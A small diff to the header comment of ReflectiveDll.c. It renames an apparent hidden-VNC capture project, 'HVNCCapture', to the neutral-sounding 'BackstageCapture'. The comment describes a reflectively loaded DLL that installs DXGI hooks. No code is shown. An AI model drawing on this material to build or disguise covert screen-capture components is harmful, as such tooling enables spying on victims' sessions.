@@ -1,5 +1,5 @@
 //===============================================================================================//
-// HVNCCapture — ReflectiveDll.c
+// BackstageCapture — ReflectiveDll.c
 //
 // Entry point for the reflective DLL. Called by ReflectiveLoader after the DLL
 // is mapped into memory. Defers DXGI hook installation to a worker thread
